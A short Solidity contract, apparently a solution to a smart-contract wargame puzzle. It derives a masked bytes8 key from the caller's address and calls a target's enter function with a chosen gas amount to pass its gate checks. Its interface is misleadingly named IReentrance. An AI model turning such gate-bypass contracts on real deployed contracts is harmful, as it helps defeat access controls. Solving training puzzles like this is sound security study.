// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function enter(bytes8 _gateKey) external;
}

contract Attack {
    IReentrance target;

    constructor(IReentrance _target) {
        target = _target;
    }

    function hack(uint256 gas) external {
        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;

        (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));
        require(sent, "Transaction failed");
    }
}